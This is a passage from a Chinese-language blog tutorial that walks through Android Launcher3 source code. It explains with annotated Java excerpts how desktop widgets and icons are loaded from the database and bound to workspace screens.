class="line">                                        + <span class="string">&quot; appWidgetId=&quot;</span> + appWidgetId</span><br><span class="line">                                        + <span class="string">&quot; status =&quot;</span> + c.restoreFlag);</span><br><span class="line">                                appWidgetInfo = <span class="keyword">new</span> <span class="title class_">LauncherAppWidgetInfo</span>(appWidgetId,</span><br><span class="line">                                        component);</span><br><span class="line">                                appWidgetInfo.restoreStatus = c.restoreFlag;</span><br><span class="line"></span><br><span class="line">                                tempPackageKey.update(component.getPackageName(), c.user);</span><br><span class="line">                                <span class="type">SessionInfo</span> <span class="variable">si</span> <span class="operator">=</span></span><br><span class="line">                                        installingPkgs.get(tempPackageKey);</span><br><span class="line">                                <span class="type">Integer</span> <span class="variable">installProgress</span> <span class="operator">=</span> si == <span class="literal">null</span></span><br><span class="line">                                        ? <span class="literal">null</span></span><br><span class="line">                                        : (<span class="type">int</span>) (si.getProgress() * <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> (c.hasRestoreFlag(LauncherAppWidgetInfo.FLAG_RESTORE_STARTED)) &#123;</span><br><span class="line">                                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (installProgress != <span class="literal">null</span>) &#123;</span><br><span class="line">                                    appWidgetInfo.restoreStatus |=</span><br><span class="line">                                            LauncherAppWidgetInfo.FLAG_RESTORE_STARTED;</span><br><span class="line">                                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!isSafeMode) &#123;</span><br><span class="line">                                    c.markDeleted(<span class="string">&quot;Unrestored widget removed: &quot;</span> + component);</span><br><span class="line">                                    <span class="keyword">continue</span>;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                appWidgetInfo.installProgress =</span><br><span class="line">                                        installProgress == <span class="literal">null</span> ? <span class="number">0</span> : installProgress;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (appWidgetInfo.hasRestoreFlag(</span><br><span class="line">                                    LauncherAppWidgetInfo.FLAG_DIRECT_CONFIG)) &#123;</span><br><span class="line">                                appWidgetInfo.bindOptions = c.parseIntent();</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            c.applyCommonProperties(appWidgetInfo);</span><br><span class="line">                            appWidgetInfo.spanX = c.getInt(spanXIndex);</span><br><span class="line">                            appWidgetInfo.spanY = c.getInt(spanYIndex);</span><br><span class="line">                            appWidgetInfo.options = c.getInt(optionsIndex);</span><br><span class="line">                            appWidgetInfo.user = c.user;</span><br><span class="line">                            appWidgetInfo.sourceContainer = c.getInt(sourceContainerIndex);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (appWidgetInfo.spanX &lt;= <span class="number">0</span> || appWidgetInfo.spanY &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                                c.markDeleted(<span class="string">&quot;Widget has invalid size: &quot;</span></span><br><span class="line">                                        + appWidgetInfo.spanX + <span class="string">&quot;x&quot;</span> + appWidgetInfo.spanY);</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            widgetProviderInfo =</span><br><span class="line">                                    widgetHelper.getLauncherAppWidgetInfo(appWidgetId);</span><br><span class="line">                            <span class="keyword">if</span> (widgetProviderInfo != <span class="literal">null</span></span><br><span class="line">                                    &amp;&amp; (appWidgetInfo.spanX &lt; widgetProviderInfo.minSpanX</span><br><span class="line">                                    || appWidgetInfo.spanY &lt; widgetProviderInfo.minSpanY)) &#123;</span><br><span class="line">                                FileLog.d(TAG, <span class="string">&quot;Widget &quot;</span> + widgetProviderInfo.getComponent()</span><br><span class="line">                                        + <span class="string">&quot; minSizes not meet: span=&quot;</span> + appWidgetInfo.spanX</span><br><span class="line">                                        + <span class="string">&quot;x&quot;</span> + appWidgetInfo.spanY + <span class="string">&quot; minSpan=&quot;</span></span><br><span class="line">                                        + widgetProviderInfo.minSpanX + <span class="string">&quot;x&quot;</span></span><br><span class="line">                                        + widgetProviderInfo.minSpanY);</span><br><span class="line">                                logWidgetInfo(mApp.getInvariantDeviceProfile(),</span><br><span class="line">                                        widgetProviderInfo);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (!c.isOnWorkspaceOrHotseat()) &#123;</span><br><span class="line">                                c.markDeleted(<span class="string">&quot;Widget found where container != &quot;</span> +</span><br><span class="line">                                        <span class="string">&quot;CONTAINER_DESKTOP nor CONTAINER_HOTSEAT - ignoring!&quot;</span>);</span><br><span class="line">                                <span class="keyword">continue</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> (!customWidget) &#123;</span><br><span class="line">                                <span class="type">String</span> <span class="variable">providerName</span> <span class="operator">=</span></span><br><span class="line">                                        appWidgetInfo.providerName.flattenToString();</span><br><span class="line">                                <span class="keyword">if</span> (!providerName.equals(savedProvider) ||</span><br><span class="line">                                        (appWidgetInfo.restoreStatus != c.restoreFlag)) &#123;</span><br><span class="line">                                    c.updater()</span><br><span class="line">                                            .put(LauncherSettings.Favorites.APPWIDGET_PROVIDER,</span><br><span class="line">                                                    providerName)</span><br><span class="line">                                            .put(LauncherSettings.Favorites.RESTORED,</span><br><span class="line">                                                    appWidgetInfo.restoreStatus)</span><br><span class="line">                                            .commit();</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (appWidgetInfo.restoreStatus !=</span><br><span class="line">                                    LauncherAppWidgetInfo.RESTORE_COMPLETED) &#123;</span><br><span class="line">                                appWidgetInfo.pendingItemInfo = WidgetsModel.newPendingItemInfo(</span><br><span class="line">                                        mApp.getContext(),</span><br><span class="line">                                        appWidgetInfo.providerName,</span><br><span class="line">                                        appWidgetInfo.user);</span><br><span class="line">                                mIconCache.getTitleAndIconForApp(</span><br><span class="line">                                        appWidgetInfo.pendingItemInfo, <span class="literal">false</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">//将能够显示在桌面上的widget存放到 sBgDataModel中。</span></span><br><span class="line">                            c.checkAndAddItem(appWidgetInfo, mBgDataModel);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    Log.e(TAG, <span class="string">&quot;Desktop items loading interrupted&quot;</span>, e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 省略部门代码......</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Load delegate items</span></span><br><span class="line">        mModelDelegate.loadItems(mUserManagerState, shortcutKeyToPinnedShortcuts);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Load string cache</span></span><br><span class="line">        mModelDelegate.loadStringCache(mBgDataModel.stringCache);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Break early if we&#x27;ve stopped loading</span></span><br><span class="line">        <span class="keyword">if</span> (mStopped) &#123;</span><br><span class="line">            mBgDataModel.clear();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Remove dead items</span></span><br><span class="line">        mItemsDeleted = c.commitDeleted();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Sort the folder items, update ranks, and make sure all preview items are high res.</span></span><br><span class="line">        <span class="type">FolderGridOrganizer</span> <span class="variable">verifier</span> <span class="operator">=</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">FolderGridOrganizer</span>(mApp.getInvariantDeviceProfile());</span><br><span class="line">        <span class="keyword">for</span> (FolderInfo folder : mBgDataModel.folders) &#123;</span><br><span class="line">            Collections.sort(folder.contents, Folder.ITEM_POS_COMPARATOR);</span><br><span class="line">            verifier.setFolderInfo(folder);</span><br><span class="line">            <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> folder.contents.size();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update ranks here to ensure there are no gaps caused by removed folder items.</span></span><br><span class="line">            <span class="comment">// Ranks are the source of truth for folder items, so cellX and cellY can be ignored</span></span><br><span class="line">            <span class="comment">// for now. Database will be updated once user manually modifies folder.</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">rank</span> <span class="operator">=</span> <span class="number">0</span>; rank &lt; size; ++rank) &#123;</span><br><span class="line">                <span class="type">WorkspaceItemInfo</span> <span class="variable">info</span> <span class="operator">=</span> folder.contents.get(rank);</span><br><span class="line">                info.rank = rank;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (info.usingLowResIcon()</span><br><span class="line">                        &amp;&amp; info.itemType == LauncherSettings.Favorites.ITEM_TYPE_APPLICATION</span><br><span class="line">                        &amp;&amp; verifier.isItemInPreview(info.rank)) &#123;</span><br><span class="line">                    mIconCache.getTitleAndIcon(info, <span class="literal">false</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        c.commitRestoredItems();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码总结成：</p><ul><li>通过 LauncherSettings.Favorites.CONTENT_URI 查询 Favorites 表的所有内容，拿到cursor。</li><li>遍历cursor，进行数据的整理。每一行数据都有一个对应的itemType，标志着这一行的数据对应的是一个应用、还是一个Widget或文件夹等。不同的类型会进行不同的处理。</li><li>对于图标类型( itemType 是ITEM_TYPE_SHORTCUT，ITEM_TYPE_APPLICATION，ITEM_TYPE_DEEP_SHORTCUT)，首先经过一系列判断，判断其是否还可用(比如应用在 Launcher 未启动时被卸载导致不可用)，不可用的话就标记为可删除，继续循环。如果可用的话，就根据当前 cursor 的内容，生成一个 ShortcutInfo 对象，保存到BgDataModel。</li><li>对于文件夹类型(itemType是ITEM_TYPE_FOLDER)，直接生成一个对应的FolderInfo对象，保存到BgDataModel。</li><li>对于AppWidget(itemType是ITEM_TYPE_APPWIDGET，ITEM_TYPE_CUSTOM_APPWIDGET)，也需要经过是否可用的判断，但是可用条件与图标类型是有差异的。如果可用，生成一个LauncherAppWidgetInfo对象，保存到BgDataModel。</li><li>所有数据库里读出的内容已经分类完毕，并且保存到了内存(BgDataModel)中。最后开始处理之前标记为可删除的内容。显示从数据库中删除对应的行，然后还要判断此次删除操作是否带来了其他需要删除的内容。比如某个文件夹或者某一页只有一个图标，这个图标因为某些原因被删掉了，那么此文件夹或页面也需要被删掉。</li></ul><h3 id="4-Workspace-数据绑定"><a href="#4-Workspace-数据绑定" class="headerlink" title="4. Workspace 数据绑定"></a>4. Workspace 数据绑定</h3><p>这一步将 sBgDataModel 中的图标放到桌面上。 放置的时候为了提高用户体现，优先放置当前屏幕的图标和 widget，然后再放其他屏幕的图标和 widget，这样用户能更快的看到图标显示完成。<br><strong>BaseLoaderResults#bindWorkspace()</strong></p><p>//BaseLoaderResults.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bindWorkspace</span><span class="params">(<span class="type">boolean</span> incrementBindId)</span> &#123;</span><br><span class="line">    <span class="comment">// 一共创建了三个信息，屏幕数，桌面图标，桌面widget。</span></span><br><span class="line">    <span class="comment">// 后面将按照屏幕数、桌面图标、桌面widget依次绘制。</span></span><br><span class="line">    ArrayList&lt;ItemInfo&gt; workspaceItems = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    ArrayList&lt;LauncherAppWidgetInfo&gt; appWidgets = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">final</span> <span class="type">IntArray</span> <span class="variable">orderedScreenIds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IntArray</span>();</span><br><span class="line">    ArrayList&lt;FixedContainerItems&gt; extraItems = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">synchronized</span> (mBgDataModel) &#123;</span><br><span class="line">        workspaceItems.addAll(mBgDataModel.workspaceItems);</span><br><span class="line">        appWidgets.addAll(mBgDataModel.appWidgets);</span><br><span class="line">        <span class="comment">// 重点关注：**** collectWorkspaceScreens() ****</span></span><br><span class="line">        <span class="comment">// 该方法做了如下操作：</span></span><br><span class="line">        <span class="comment">// 图标信息到位之后，先找到当前屏幕。</span></span><br><span class="line">        <span class="comment">// 获取屏幕的id，屏幕的id是0,1,2这个顺序，且严格按照这个顺序。</span></span><br><span class="line">        <span class="comment">// 比如Id为1，则必定是从左往右的第2个屏幕。在图标信息iteminfo里面存有每个图标的screenid信息</span></span><br><span class="line">        orderedScreenIds.addAll(mBgDataModel.collectWorkspaceScreens());</span><br><span class="line"></span><br><span class="line">        mBgDataModel.extraItems.forEach(extraItems::add);</span><br><span class="line">        <span class="keyword">if</span> (incrementBindId) &#123;</span><br><span class="line">            mBgDataModel.lastBindId++;</span><br><span class="line">        &#125;</span><br><span class="line">        mMyBindingId = mBgDataModel.lastBindId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (Callbacks cb : mCallbacksList) &#123;</span><br><span class="line">        <span class="comment">// 重点关注：****** bind() *********</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">WorkspaceBinder</span>(cb, mUiExecutor, mApp, mBgDataModel, mMyBindingId,</span><br><span class="line">                workspaceItems, appWidgets, extraItems, orderedScreenIds).bind();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码做了两个操作：一个优先找出当前屏幕、二个绑定操作。<br>这里重点关注绑定操作 <strong>BaseLoaderResults.WorkspaceBinder#bind()</strong> :</p><p>// BaseLoaderResults.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">bind</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">IntSet</span> <span class="variable">currentScreenIds</span> <span class="operator">=</span></span><br><span class="line">            mCallbacks.getPagesToBindSynchronously(mOrderedScreenIds);</span><br><span class="line">    Objects.requireNonNull(currentScreenIds, <span class="string">&quot;Null screen ids provided by &quot;</span> + mCallbacks);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将图标分为在 当前屏幕 和 没有在当前屏幕，</span></span><br><span class="line">    <span class="comment">// 且由于widget 和其他类型的文件有巨大差异，如内容提供方和占空间大小。所以，widget和其他分为两类。</span></span><br><span class="line">    ArrayList&lt;ItemInfo&gt; currentWorkspaceItems = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    ArrayList&lt;ItemInfo&gt; otherWorkspaceItems = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    ArrayList&lt;LauncherAppWidgetInfo&gt; currentAppWidgets = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    ArrayList&lt;LauncherAppWidgetInfo&gt; otherAppWidgets = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (TestProtocol.sDebugTracing) &#123;</span><br><span class="line">        Log.d(TestProtocol.NULL_INT_SET, <span class="string">&quot;bind (1) currentScreenIds: &quot;</span></span><br><span class="line">                + currentScreenIds</span><br><span class="line">                + <span class="string">&quot;, pointer: &quot;</span></span><br><span class="line">                + mCallbacks</span><br><span class="line">                + <span class="string">&quot;, name: &quot;</span></span><br><span class="line">                + mCallbacks.getClass().getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 区分是否在当前屏幕 filterCurrentWorkspaceItems()，</span></span><br><span class="line">    <span class="comment">// 通过比较 if (currentScreenIds.contains(info.screenId)) 来确定是否在当前屏幕</span></span><br><span class="line">    filterCurrentWorkspaceItems(currentScreenIds, mWorkspaceItems, currentWorkspaceItems,</span><br><span class="line">            otherWorkspaceItems);</span><br><span class="line">    <span class="keyword">if</span> (TestProtocol.sDebugTracing) &#123;</span><br><span class="line">        Log.d(TestProtocol.NULL_INT_SET, <span class="string">&quot;bind (2) currentScreenIds: &quot;</span></span><br><span class="line">                + currentScreenIds);</span><br><span class="line">    &#125;</span><br><span class="line">    filterCurrentWorkspaceItems(currentScreenIds, mAppWidgets, currentAppWidgets,</span><br><span class="line">            otherAppWidgets);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">InvariantDeviceProfile</span> <span class="variable">idp</span> <span class="operator">=</span> mApp.getInvariantDeviceProfile();</span><br><span class="line">    <span class="comment">// 然后将图标进行整理，将图标从上到下从左到右按顺序排好，</span></span><br><span class="line">    <span class="comment">// 因为图标的显示始终是一个一个依次显示，虽然速度很快，</span></span><br><span class="line">    <span class="comment">// 但是在手机卡顿的时候，难免第一个图标和最后一个图标还是能被人感知。</span></span><br><span class="line">    <span class="comment">// 如果有顺序的显示，用户体验会好很多。</span></span><br><span class="line">    sortWorkspaceItemsSpatially(idp, currentWorkspaceItems);</span><br><span class="line">    sortWorkspaceItemsSpatially(idp, otherWorkspaceItems);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 告诉 workspace 我们即将开始绑定项目</span></span><br><span class="line">    <span class="comment">// 这里调用了 Launcher 的 startBinding 方法，</span></span><br><span class="line">    <span class="comment">// google Launcher 的习惯先用一个start的方法作为一个实际操作的开始，</span></span><br><span class="line">    <span class="comment">// 这里的 startBinding 会完成 resetLayout 等清空数据的操作</span></span><br><span class="line">    executeCallbacksTask(c -&gt; &#123;</span><br><span class="line">        c.clearPendingBinds();</span><br><span class="line">        c.startBinding();</span><br><span class="line">    &#125;, mUiExecutor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 而后是核心代码，首先绑定屏幕，传入的参数是 mOrderedScreenIds，参数源于数据库。</span></span><br><span class="line">    executeCallbacksTask(c -&gt; c.bindScreens(mOrderedScreenIds), mUiExecutor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">///以上完成了屏幕的添加，随后就添加桌面的图标和 widget，于是传入了当前显示屏幕的图标和 widget。</span></span><br><span class="line">    <span class="comment">// 这是第一屏幕绑定</span></span><br><span class="line">    bindWorkspaceItems(currentWorkspaceItems, mUiExecutor);</span><br><span class="line">    bindAppWidgets(currentAppWidgets, mUiExecutor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 这是其他屏幕绑定</span></span><br><span class="line">    bindWorkspaceItems(otherWorkspaceItems, pendingExecutor);</span><br><span class="line">    bindAppWidgets(otherAppWidgets, pendingExecutor);</span><br><span class="line">    <span class="comment">// 紧接着告诉桌面我们已经绑定完成，</span></span><br><span class="line">    <span class="comment">// 即调用 finishBindingItems ，和之前的start方法形成照应</span></span><br><span class="line">    executeCallbacksTask(c -&gt; c.finishBindingItems(currentScreenIds), pendingExecutor);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 省略部分代码......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码最后面的四个绑定操作：</p><ul><li>c.startBinding()</li><li>c.bindScreens()</li><li>bindWorkspaceItems()</li><li>bindAppWidgets()</li></ul><p>四个绑定操作中，下面将对： **c.bindScreens()**、 <strong>bindWorkspaceItems()</strong> 这两个展开分析。</p><h4 id="4-1-第一个绑定操作"><a href="#4-1-第一个绑定操作" class="headerlink" title="4.1 第一个绑定操作"></a>4.1 第一个绑定操作</h4><p>像 <strong>c.startBinding()</strong> 、 <strong>c.bindScreens()</strong> 这两个直接回调到 <strong>Launcher.java</strong> 中。</p><p>这里先看下 <strong>c.bindScreens()</strong> 方法 <strong>Launcher#bindScreens()</strong>:</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/Launcher.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里要注意点：注意定制的google搜索栏不存于数据库中，其具备不可移动不可删除的特性，而 google 搜索栏在创建时是随着屏幕一同创建的。</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bindScreens</span><span class="params">(IntArray orderedScreenIds)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">firstScreenPosition</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (FeatureFlags.QSB_ON_FIRST_SCREEN &amp;&amp;</span><br><span class="line">            orderedScreenIds.indexOf(Workspace.FIRST_SCREEN_ID) != firstScreenPosition) &#123;</span><br><span class="line">        orderedScreenIds.removeValue(Workspace.FIRST_SCREEN_ID);</span><br><span class="line">        orderedScreenIds.add(firstScreenPosition, Workspace.FIRST_SCREEN_ID);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!FeatureFlags.QSB_ON_FIRST_SCREEN &amp;&amp; orderedScreenIds.isEmpty()) &#123;</span><br><span class="line">        <span class="comment">// If there are no screens, we need to have an empty screen</span></span><br><span class="line">        mWorkspace.addExtraEmptyScreens();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//对于绑定屏幕实质是：创建与数据库中屏幕数一致的空屏幕。</span></span><br><span class="line">    <span class="comment">// 该方法里面会一直调到：Workspace#insertNewWorkspaceScreen() 方法，</span></span><br><span class="line">    <span class="comment">// 通过 addview() 添加添加空屏幕</span></span><br><span class="line">    bindAddScreens(orderedScreenIds);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// After we have added all the screens, if the wallpaper was locked to the default state,</span></span><br><span class="line">    <span class="comment">// then notify to indicate that it can be released and a proper wallpaper offset can be</span></span><br><span class="line">    <span class="comment">// computed before the next layout</span></span><br><span class="line">    mWorkspace.unlockWallpaperFromDefaultPageOnNextLayout();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上完成了屏幕的添加，随后就添加桌面的图标和 <strong>widget</strong>，于是传入了当前显示屏幕的图标和 <strong>widget</strong>。</p><h4 id="4-2-第二个绑定操作"><a href="#4-2-第二个绑定操作" class="headerlink" title="4.2 第二个绑定操作"></a>4.2 第二个绑定操作</h4><p>接着看第二个绑定操作 <strong>bindWorkspaceItems()</strong> ，绑定图标是回调 <strong>Launcher.java</strong> 的对应方法，且绑定时按照不同 item 类型进行不同的绘制。<br>看 <strong>Launcher#bindItems()</strong>:</p><p><strong>packages/apps/Launcher3/src/com/android/launcher3/Launcher.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">bindItems</span><span class="params">(</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> List&lt;ItemInfo&gt; items,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> <span class="type">boolean</span> forceAnimateIcons,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> <span class="type">boolean</span> focusFirstItemForAccessibility)</span> &#123;</span><br><span class="line">    <span class="comment">// Get the list of added items and intersect them with the set of items here</span></span><br><span class="line">    <span class="keyword">final</span> Collection&lt;Animator&gt; bounceAnims = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">canAnimatePageChange</span> <span class="operator">=</span> canAnimatePageChange();</span><br><span class="line">    Workspace&lt;?&gt; workspace = mWorkspace;</span><br><span class="line">    <span class="type">int</span> <span class="variable">newItemsScreenId</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">end</span> <span class="operator">=</span> items.size();</span><br><span class="line">    <span class="type">View</span> <span class="variable">newView</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; end; i++) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">ItemInfo</span> <span class="variable">item</span> <span class="operator">=</span> items.get(i);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 首先进行一个简单判断，如果当前图标是放在快捷栏，而当前手机是没有快捷栏的，则不进行这个图标显示。</span></span><br><span class="line">        <span class="keyword">if</span> (item.container == LauncherSettings.Favorites.CONTAINER_HOTSEAT &amp;&amp;</span><br><span class="line">                mHotseat == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> View view;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (item.itemType) &#123;</span><br><span class="line">            <span class="comment">// 图标有所细分，单个图标的统一为一类，使用createShortcut() 来创建。</span></span><br><span class="line">            <span class="keyword">case</span> LauncherSettings.Favorites.ITEM_TYPE_APPLICATION:</span><br><span class="line">            <span class="keyword">case</span> LauncherSettings.Favorites.ITEM_TYPE_SHORTCUT:</span><br><span class="line">            <span class="keyword">case</span> LauncherSettings.Favorites.ITEM_TYPE_DEEP_SHORTCUT: &#123;</span><br><span class="line">                <span class="type">WorkspaceItemInfo</span> <span class="variable">info</span> <span class="operator">=</span> (WorkspaceItemInfo) item;</span><br><span class="line">                <span class="comment">// *********1、重点关注 ********</span></span><br><span class="line">                view = createShortcut(info);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">case</span> LauncherSettings.Favorites.ITEM_TYPE_FOLDER: &#123;</span><br><span class="line">                <span class="comment">// *********2、重点关注 ********</span></span><br><span class="line">                view = FolderIcon.inflateFolderAndIcon(R.layout.folder_icon, <span class="built_in">this</span>,</span><br><span class="line">                        (ViewGroup) workspace.getChildAt(workspace.getCurrentPage()),</span><br><span class="line">                        (FolderInfo) item);</span><br><span class="line">                <span 